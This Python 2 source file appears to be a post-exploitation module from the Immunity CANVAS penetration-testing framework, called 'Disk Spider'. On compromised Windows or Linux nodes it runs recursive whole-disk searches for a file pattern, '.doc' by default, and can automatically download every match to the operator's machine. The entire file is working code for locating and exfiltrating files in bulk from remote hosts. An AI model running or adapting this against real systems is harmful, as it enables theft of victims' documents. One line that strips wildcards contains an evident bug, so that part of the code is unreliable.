#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit

# info
NAME = "Disk Spider"
VERSION = "1.0"
DESCRIPTION = "Searches a remote node for a file pattern. Optionally can download all matching files automatically." \
              "Please note that searching the primary hard drive and/or downloading files can take a few minutes," \
              "unless CANVAS reports an error just be patient and you should see results."
DOCUMENTATION = {}

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows","Linux"] ]

class theexploit(canvasexploit):
    def __init__(self):
        """ init """

        canvasexploit.__init__(self)
        self.result = ""
        self.name = NAME
        self.search_pattern = ".doc"
        self.auto_download  = False
        self.local_path     = "Your_Documents//"
        self.download_count = 0
        
        return

    def getArgs(self):
        """ get args """
        self.search_pattern = self.argsDict.get("search_pattern", self.search_pattern)
        self.auto_download  = self.argsDict.get("auto_download", self.auto_download)

        return 

    def spider_disk( self, node ):
        
        output    = ""
        command   = ""
        file_list = []
        
        if node.nodetype in ["win32Node"]:
            
            # Win32 find() doesn't take wildcards, and will 
            # give incorrect results, strip it out
            if "*" in self.search_pattern:
                self.search_pattern = command.replace("*","", command )
                
            command = "dir /s /b c:\\ | find \"%s\"" % self.search_pattern
            
            
                    
        if node.nodetype in ["linuxNode"]:

            # The *nix find() call needs a wildcard so we put one in here
            # for good measure
            if "*" not in self.search_pattern:
                self.search_pattern = "*%s" % self.search_pattern
                
            command = "find / -name %s" % self.search_pattern
                
        output  = node.runcommand( command )
        
        self.log("Output: %s" % output)
        if node.nodetype in ["win32Node"]:
            file_list = output.split("\r\n")
        else:
            file_list = output.split("\n")
                
        # If auto-download is selected then grab the file
        if self.auto_download:
            
            for file in file_list:
                
                if self.search_pattern in file:
                    self.log("Downloading file: %s" % file)
                    if "\\" in file:
                        local_file = file.split("\\")[::-1][0]
                    elif "/" in file:
                        local_file = file.split("/")[::-1][0]
                    else:
                        local_file = file
                        
                    try:
                        node.download( file, "%s%s" % ( self.local_path, local_file ))
                        self.log("Download of %s complete!" % file)
                        self.download_count += 1
                    except NodeCommandError, e:
                        self.log("Exception when attempting to download: %s (%s). Skipping..." % ( file, e.value ) )
                        pass
                    except:
                        self.log("Unknown error when downloading: %s. Skipping..." % file )
                        pass
            
            
            
        self.log("Here are the matching files for the search pattern: %s" % self.search_pattern)
        self.log("%s" % output)
        
        if self.auto_download:
            self.log("Number of files downloaded successfully: %d" % self.download_count)
            self.log("All files downloaded to: %s" % self.local_path)
            
        return
                                       
    def run(self):
        """ main """
        
        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()

        for node in self.argsDict["passednodes"]:    
            ret = self.spider_disk( node )

        return ret

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."
    
